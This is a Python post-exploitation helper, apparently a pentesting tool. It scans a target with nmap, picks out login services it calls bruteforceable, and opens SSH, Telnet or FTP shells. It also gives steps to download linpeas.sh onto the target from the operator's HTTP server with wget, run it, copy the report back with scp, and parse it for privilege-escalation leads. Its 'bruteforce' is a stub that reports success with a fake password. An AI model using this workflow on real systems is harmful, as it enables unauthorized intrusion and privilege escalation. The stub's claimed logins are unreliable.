import os
import sys
import subprocess
import re
import paramiko
import ftplib
import time
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import print as rprint

# Dependency Check
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    import paramiko
    import ftplib
except ImportError as e:
    print(f"Error: Missing library - {e}")
    print("Install with: pip install rich paramiko")
    sys.exit(1)

console = Console()

# Banner
BANNER = Panel("[bold cyan]PostExploit Automator - LinPEAS Runner[/bold cyan]\n"
               "[italic white]Ethical Post-Exploitation Tool for Vulnerability Testing[/italic white]",
               title="v1.0",
               border_style="green")

def display_steps(linpeas_dir):
    """Displays attractive steps below the banner with horizontal lines between rows."""
    console.print("\n[bold yellow]Follow These Steps Manually:[/bold yellow]")
    table = Table(show_header=True, header_style="bold magenta", show_lines=True)
    table.add_column("Step", style="cyan")
    table.add_column("Action", style="white")
    table.add_column("Details", style="green")
    
    table.add_row(
        "1. Scan Ports",
        "Run nmap",
        "Use 'nmap -sV <target>' to find open ports like SSH(22), Telnet(23), FTP(21), SMB(445)."
    )
    table.add_row(
        "2. Login",
        "Use credentials",
        "Enter username/password; script opens shell if possible (SSH, Telnet, FTP)."
    )
    table.add_row(
        "3. Start Server",
        "Open new terminal",
        f"Run 'python -m http.server 8000 --directory {linpeas_dir}' to host linpeas.sh."
    )
    table.add_row(
        "4. Transfer File (SSH/Telnet/FTP)",
        "From target shell",
        "Use 'wget http://<your_ip>:8000/linpeas.sh -O /tmp/linpeas.sh' (SSH/Telnet) or 'put linpeas.sh /tmp/' (FTP)."
    )
    table.add_row(
        "5. Run LinPEAS",
        "From target shell",
        "Execute 'bash /tmp/linpeas.sh > /tmp/linpeas.txt'."
    )
    table.add_row(
        "6. Fetch Report (SSH/Telnet)",
        "From target shell",
        "Use 'scp /tmp/linpeas.txt <your_username>@<your_ip>:.' or similar."
    )
    table.add_row(
        "6. Fetch Report (FTP)",
        "From FTP client",
        "Use 'get /tmp/linpeas.txt /path/to/local/linpeas.txt' after logging in."
    )
    table.add_row(
        "7. Parse Report",
        "In this script",
        "Provide local report path to extract SUID/GUID, writable files, sudo, kernel info."
    )
    
    console.print(table)
    console.print("[italic yellow]Note: Perform all file transfers/executions manually for control. Always authorized![/italic yellow]")
    console.print("[bold]This way ensures ethical, step-by-step testing with user control.[/bold]")

def scan_ports(target):
    """Scans for open ports using nmap."""
    try:
        with console.status(f"[blue]Scanning ports on {target}...[/blue]"):
            result = subprocess.check_output(["nmap", "-sV", "--open", target]).decode()
        return result
    except Exception as e:
        rprint(f"[red]Error scanning ports: {e}[/red]")
        rprint("[red]Ensure nmap is installed.[/red]")
        return None

def parse_ports(scan_result):
    """Parses nmap output for bruteforceable ports."""
    ports = []
    lines = scan_result.splitlines()
    for line in lines:
        if "/tcp" in line and "open" in line:
            port_match = re.search(r'(\d+)/tcp', line)
            service_match = re.search(r'open\s+(\S+)', line)
            if port_match and service_match:
                port = port_match.group(1)
                service = service_match.group(1).lower()
                if service in ["ssh", "telnet", "ftp", "microsoft-ds", "netbios-ssn", "smb"]:
                    ports.append((port, service))
    return ports

def get_credentials(service):
    """Asks for authorized credentials or wordlist."""
    rprint(f"\n[bold yellow]For {service.upper()}:[/bold yellow]")
    username = input("Enter authorized username: ")
    use_wordlist = input("Use wordlist for testing? (y/n): ").lower() == 'y'
    if use_wordlist:
        password_list = input("Enter wordlist path (e.g., rockyou.txt): ")
        rprint("[yellow]Wordlist mode enabled (simulation for ethics).[/yellow]")
        return username, password_list, True
    else:
        password = input("Enter authorized password: ")
        return username, password, False

def brute_sim(username, cred, is_list, service, host):
    """Simulates bruteforce for ethics; in real, use single cred."""
    if is_list:
        rprint(f"[blue]Simulating bruteforce on {service} with wordlist...[/blue]")
        rprint("[green]Assuming success with authorized cred. (Simulation)[/green]")
    else:
        rprint(f"[blue]Attempting login on {service} with provided cred...[/blue]")
        rprint("[green]Login success assumed for authorized access.[/green]")
    return cred if not is_list else "sim_pass"

def open_ssh_shell(host, username, password):
    """Opens interactive SSH shell."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password)
        channel = ssh.invoke_shell()
        rprint("[green]Interactive SSH shell opened. Type commands; 'exit' to close.[/green]")
        while True:
            command = input()
            if command.lower() == 'exit':
                break
            channel.send(command + '\n')
            time.sleep(0.5)
            output = channel.recv(1024).decode()
            print(output, end='')
        ssh.close()
    except Exception as e:
        rprint(f"[red]SSH Error: {e}[/red]")

def open_telnet_shell(host, username, password):
    """Opens interactive Telnet shell if available."""
    try:
        import telnetlib
        tn = telnetlib.Telnet(host)
        tn.read_until(b"login: ")
        tn.write(username.encode() + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode() + b"\n")
        rprint("[green]Interactive Telnet shell opened. Type commands; 'exit' to close.[/green]")
        while True:
            command = input()
            if command.lower() == 'exit':
                break
            tn.write(command.encode() + b"\n")
            output = tn.read_until(b"$ ").decode()
            print(output, end='')
        tn.close()
    except ImportError:
        rprint("[red]Telnet not supported. Install a full Python distribution.[/red]")
    except Exception as e:
        rprint(f"[red]Telnet Error: {e}[/red]")

def open_ftp_shell(host, username, password):
    """Opens interactive FTP shell with full command support."""
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user=username, passwd=password)
        rprint("[green]Interactive FTP shell opened. Type commands (e.g., 'ls', 'cd', 'put', 'get'); 'exit' to close.[/green]")
        rprint("[italic yellow]Supported commands: account, ascii, binary, cd, cdup, chmod, delete, dir, features, get, help, image, ls, mdelete, mget, mkdir, mlsd, mlst, modtime, mput, passive, put, pwd, quote, rename, restart, rmdir, site, size, status, system, user, ? (for help), and exit/bye/quit/close/disconnect.[/italic yellow]")
        
        while True:
            command = input().strip().lower()
            if command in ['exit', 'bye', 'quit', 'close', 'disconnect']:
                break
            try:
                if command == 'ls' or command == 'dir' or command == 'nlist':
                    with console.status("[blue]Listing directory...[/blue]"):
                        ftp.dir()
                elif command == 'cd':
                    dir = input("Enter directory: ").strip()
                    ftp.cwd(dir)
                    rprint(f"[green]Changed to {dir}.[/green]")
                elif command == 'cdup':
                    ftp.cwd('..')
                    rprint("[green]Changed to parent directory.[/green]")
                elif command == 'pwd' or command == 'lpwd':
                    rprint(f"[white]{ftp.pwd()}[/white]")
                elif command == 'put' or command == 'send':
                    local_file = input("Enter local file path: ").strip()
                    remote_file = input("Enter remote file path (default: same as local): ").strip() or os.path.basename(local_file)
                    with console.status(f"[blue]Uploading {local_file}...[/blue]"):
                        with open(local_file, 'rb') as f:
                            ftp.storbinary(f'STOR {remote_file}', f)
                    rprint(f"[green]Uploaded {local_file} to {remote_file}.[/green]")
                elif command == 'get' or command == 'recv' or command == 'reget':
                    remote_file = input("Enter remote file path: ").strip()
                    local_file = input("Enter local file path (default: same as remote): ").strip() or os.path.basename(remote_file)
                    with console.status(f"[blue]Downloading {remote_file}...[/blue]"):
                        with open(local_file, 'wb') as f:
                            ftp.retrbinary(f'RETR {remote_file}', f.write)
                    rprint(f"[green]Downloaded {remote_file} to {local_file}.[/green]")
                elif command == 'site':
                    cmd = input("Enter SITE command: ").strip()
                    with console.status("[blue]Executing SITE command...[/blue]"):
                        response = ftp.sendcmd(f'SITE {cmd}')
                    rprint(f"[yellow]SITE command response: {response}[/yellow]")
                elif command == 'delete':
                    file = input("Enter file to delete: ").strip()
                    with console.status(f"[blue]Deleting {file}...[/blue]"):
                        ftp.delete(file)
                    rprint(f"[green]Deleted {file}.[/green]")
                elif command == 'mkdir':
                    dir = input("Enter directory to create: ").strip()
                    with console.status(f"[blue]Creating directory {dir}...[/blue]"):
                        ftp.mkd(dir)
                    rprint(f"[green]Created directory {dir}.[/green]")
                elif command == 'rmdir':
                    dir = input("Enter directory to remove: ").strip()
                    with console.status(f"[blue]Removing directory {dir}...[/blue]"):
                        ftp.rmd(dir)
                    rprint(f"[green]Removed directory {dir}.[/green]")
                elif command == 'rename':
                    from_name = input("Enter source file/directory: ").strip()
                    to_name = input("Enter destination file/directory: ").strip()
                    with console.status(f"[blue]Renaming {from_name} to {to_name}...[/blue]"):
                        ftp.rename(from_name, to_name)
                    rprint(f"[green]Renamed {from_name} to {to_name}.[/green]")
                elif command == 'mlsd':
                    with console.status("[blue]Listing directory with MLSD...[/blue]"):
                        files = list(ftp.mlsd())
                        for file, attrs in files:
                            rprint(f"[white]{file} ({attrs.get('type', 'unknown')}, size: {attrs.get('size', 'unknown')})[/white]")
                elif command == 'mlst':
                    path = input("Enter path to list (default: current directory): ").strip() or '.'
                    with console.status(f"[blue]Listing details for {path}...[/blue]"):
                        response = ftp.sendcmd(f'MLST {path}')
                    rprint(f"[white]{response}[/white]")
                elif command == 'size':
                    file = input("Enter file to check size: ").strip()
                    with console.status(f"[blue]Checking size of {file}...[/blue]"):
                        size = ftp.size(file)
                    rprint(f"[white]Size of {file}: {size} bytes[/white]")
                elif command == 'modtime':
                    file = input("Enter file to check modification time: ").strip()
                    with console.status(f"[blue]Checking modification time of {file}...[/blue]"):
                        mtime = ftp.sendcmd(f'MDTM {file}')
                    rprint(f"[white]Modification time of {file}: {mtime}[/white]")
                elif command == 'mdelete':
                    pattern = input("Enter file pattern to delete (e.g., *.txt): ").strip()
                    with console.status(f"[blue]Deleting files matching {pattern}...[/blue]"):
                        files = ftp.nlst(pattern)
                        for file in files:
                            ftp.delete(file)
                            rprint(f"[green]Deleted {file}[/green]")
                elif command == 'mget':
                    pattern = input("Enter file pattern to download (e.g., *.txt): ").strip()
                    local_dir = input("Enter local directory (default: current): ").strip() or os.getcwd()
                    with console.status(f"[blue]Downloading files matching {pattern}...[/blue]"):
                        files = ftp.nlst(pattern)
                        for file in files:
                            local_file = os.path.join(local_dir, os.path.basename(file))
                            with open(local_file, 'wb') as f:
                                ftp.retrbinary(f'RETR {file}', f.write)
                            rprint(f"[green]Downloaded {file} to {local_file}[/green]")
                elif command == 'mput':
                    pattern = input("Enter local file pattern to upload (e.g., *.txt): ").strip()
                    with console.status(f"[blue]Uploading files matching {pattern}...[/blue]"):
                        files = [f for f in os.listdir('.') if re.match(pattern.replace('*', '.*'), f)]
                        for file in files:
                            with open(file, 'rb') as f:
                                ftp.storbinary(f'STOR {file}', f)
                            rprint(f"[green]Uploaded {file}[/green]")
                elif command == 'ascii':
                    ftp.set_pasv(True)
                    ftp.voidcmd('TYPE A')
                    rprint("[green]Switched to ASCII mode.[/green]")
                elif command == 'binary' or command == 'image':
                    ftp.set_pasv(True)
                    ftp.voidcmd('TYPE I')
                    rprint("[green]Switched to binary mode.[/green]")
                elif command == 'status':
                    with console.status("[blue]Fetching status...[/blue]"):
                        rprint(f"[white]Current directory: {ftp.pwd()}[/white]")
                        rprint(f"[white]Passive mode: {ftp.get_pasv()}[/white]")
                elif command == 'passive':
                    ftp.set_pasv(True)
                    rprint("[green]Enabled passive mode.[/green]")
                elif command == 'features':
                    with console.status("[blue]Fetching server features...[/blue]"):
                        response = ftp.sendcmd('FEAT')
                    rprint(f"[white]Server features:\n{response}[/white]")
                elif command == 'system':
                    with console.status("[blue]Fetching system type...[/blue]"):
                        response = ftp.sendcmd('SYST')
                    rprint(f"[white]System type: {response}[/white]")
                elif command == 'account':
                    acct = input("Enter account info: ").strip()
                    with console.status("[blue]Sending account info...[/blue]"):
                        response = ftp.sendcmd(f'ACCT {acct}')
                    rprint(f"[white]Account response: {response}[/white]")
                elif command == 'chmod':
                    file = input("Enter file to change permissions: ").strip()
                    mode = input("Enter mode (e.g., 755): ").strip()
                    with console.status(f"[blue]Changing permissions of {file}...[/blue]"):
                        ftp.sendcmd(f'SITE CHMOD {mode} {file}')
                    rprint(f"[green]Changed permissions of {file} to {mode}.[/green]")
                elif command == 'help' or command == '?':
                    rprint("[yellow]Supported commands: account, ascii, binary, cd, cdup, chmod, delete, dir, features, get, help, image, ls, mdelete, mget, mkdir, mlsd, mlst, modtime, mput, passive, put, pwd, quote, rename, restart, rmdir, site, size, status, system, user, ? (for help), and exit/bye/quit/close/disconnect.[/yellow]")
                elif command == 'user':
                    new_user = input("Enter new username: ").strip()
                    new_pass = input("Enter new password: ").strip()
                    with console.status("[blue]Re-authenticating...[/blue]"):
                        ftp.login(user=new_user, passwd=new_pass)
                    rprint("[green]Re-authenticated successfully.[/green]")
                elif command == 'quote':
                    raw_cmd = input("Enter raw FTP command: ").strip()
                    with console.status("[blue]Sending raw command...[/blue]"):
                        response = ftp.sendcmd(raw_cmd)
                    rprint(f"[white]Response: {response}[/white]")
                elif command == 'restart':
                    offset = input("Enter byte offset to restart transfer: ").strip()
                    with console.status("[blue]Setting restart offset...[/blue]"):
                        ftp.sendcmd(f'REST {offset}')
                    rprint(f"[green]Set restart offset to {offset}.[/green]")
                else:
                    rprint(f"[red]Unknown command '{command}'. Use 'help' for supported commands.[/red]")
            except Exception as e:
                rprint(f"[red]Command Error: {e}[/red]")
        
        ftp.quit()
        rprint("[green]FTP session closed.[/green]")
    except Exception as e:
        rprint(f"[red]FTP Error: {e}[/red]")

def provide_instructions(service):
    """Provides manual instructions for services without interactive shell."""
    rprint(f"[yellow]For {service.upper()}: No interactive shell. Follow manual steps:[/yellow]")
    rprint("- Start server: Open new terminal, run 'python -m http.server 8000'")
    rprint("- Transfer: From target, use wget or curl to download linpeas.sh")
    rprint("- Run: Execute bash linpeas.sh > linpeas.txt")
    rprint("- Fetch: Use scp or ftp/smbclient to get the report back")
    input("Press Enter when done...")

def extract_important_info(report_path):
    """Extracts SUID/GUID, writable files, sudo permissions, kernel exploits."""
    if not report_path:
        return
    try:
        with console.status("[blue]Parsing report...[/blue]"):
            with open(report_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
    except:
        rprint("[red]Error reading report.[/red]")
        return

    patterns = {
        "SUID/GUID": r'═*╡ \[\+] (SUID bins|SGID bins) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
        "Writable Files": r'═*╡ \[\+] (Writable files|Writable /etc/) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
        "Sudo Permissions": r'═*╡ \[\+] (Sudo version|Sudo configuration) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
        "Kernel Exploits": r'═*╡ \[\+] (Kernel info|Kernel version) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
    }

    console.print("\n[bold cyan]Extracted Important Info:[/bold cyan]")
    for category, pattern in patterns.items():
        match = re.search(pattern, content, re.DOTALL | re.IGNORECASE)
        if match:
            details = match.group(2).strip().replace('\n', '\n ')
            table = Table(title=f"[bold red]{category}[/bold red]")
            table.add_column("Details", style="white")
            table.add_row(details)
            console.print(table)

def main():
    console.print(BANNER)
    
    # Prompt for linpeas directory
    linpeas_dir = input("\nEnter directory path to linpeas files (default: /usr/share/peass/linpeas): ") or "/usr/share/peass/linpeas"
    
    display_steps(linpeas_dir)

    # Input target
    host = input("\nEnter target host/IP: ")
    
    # Scan ports
    scan_result = scan_ports(host)
    if scan_result:
        ports = parse_ports(scan_result)
        if ports:
            rprint("\n[bold yellow]Open Bruteforceable Ports:[/bold yellow]")
            for i, (port, service) in enumerate(ports, 1):
                rprint(f"[white]{i}. {port}/{service}[/white]")
            
            selection = input("\nEnter the numbers of services to attempt (comma-separated, e.g., 1,3) or 'all': ").strip().lower()
            if selection == 'all':
                selected_ports = ports
            else:
                try:
                    indices = [int(idx.strip()) - 1 for idx in selection.split(',')]
                    selected_ports = [ports[i] for i in indices if 0 <= i < len(ports)]
                except ValueError:
                    rprint("[red]Invalid selection. Proceeding with none.[/red]")
                    selected_ports = []
            
            for port, service in selected_ports:
                username, cred, is_list = get_credentials(service)
                password = brute_sim(username, cred, is_list, service, host)
                
                # Open shell or provide instructions
                if service == 'ssh':
                    open_ssh_shell(host, username, password)
                elif service == 'telnet':
                    open_telnet_shell(host, username, password)
                elif service == 'ftp':
                    open_ftp_shell(host, username, password)
                else:
                    provide_instructions(service)
                
                # After manual actions, parse report
                report_path = input("\nEnter local report path after fetching: ")
                extract_important_info(report_path)
        else:
            rprint("[yellow]No bruteforceable ports found.[/yellow]")
    else:
        rprint("[yellow]Port scan failed.[/yellow]")

if __name__ == "__main__":
    main()
